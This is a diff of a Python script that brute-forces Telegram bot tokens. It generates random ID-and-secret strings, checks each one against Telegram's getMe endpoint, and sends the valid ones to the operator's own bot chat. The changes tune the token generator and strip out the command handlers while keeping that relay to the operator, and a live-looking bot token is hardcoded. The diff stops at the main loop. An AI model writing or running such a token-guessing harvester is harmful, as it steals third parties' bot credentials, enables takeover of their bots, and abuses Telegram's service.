@@ -3,8 +3,7 @@ import random
 import string
 import logging
 import time
-from telegram import Bot, Update
-from telegram.ext import Updater, CommandHandler, CallbackContext
+from telegram import Bot
 
 # Your bot's token where you want to send the found tokens
 YOUR_BOT_TOKEN = '5583773090:AAF-fazf-qderti_gq1yPf2Avk1Z3Gq7cKI'
@@ -18,9 +17,15 @@ logger = logging.getLogger(__name__)
 attempts = []
 
 def generate_random_token():
-    part1 = ''.join(random.choices(string.digits, k=9))
-    part2 = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase + '-_', k=35))
-    return f"{part1}:{part2}"
+    # Generate the bot ID part: 7 to 10 digits
+    bot_id_length = random.randint(7, 10)
+    bot_id = ''.join(random.choices(string.digits, k=bot_id_length))
+    
+    # Generate the secret part: 35 characters
+    characters = string.digits + string.ascii_letters + '-_'
+    secret = ''.join(random.choices(characters, k=35))
+    
+    return f"{bot_id}:{secret}"
 
 def check_token(token):
     url = f"https://api.telegram.org/bot{token}/getMe"
@@ -34,29 +39,9 @@ def send_message_to_admin(message):
     bot = Bot(token=YOUR_BOT_TOKEN)
     bot.send_message(chat_id=CHAT_ID, text=message)
 
-def start(update: Update, context: CallbackContext) -> None:
-    message = "Bot is UP\nUse /status to check all attempts."
-    update.message.reply_text(message)
-
-def status(update: Update, context: CallbackContext) -> None:
-    message = "Attempts:\n" + "\n".join(attempts)
-    update.message.reply_text(message)
-
 def main():
     # Notify admin that the bot has started
     send_message_to_admin("Bot started and checking for valid tokens...")
-
-    # Set up the updater and dispatcher
-    updater = Updater(YOUR_BOT_TOKEN)
-    dispatcher = updater.dispatcher
-
-    # Add command handlers to dispatcher
-    dispatcher.add_handler(CommandHandler("start", start))
-    dispatcher.add_handler(CommandHandler("status", status))
-
-    # Start the bot
-    updater.start_polling()
-    logger.info("Bot started")
 
     while True:
         try:
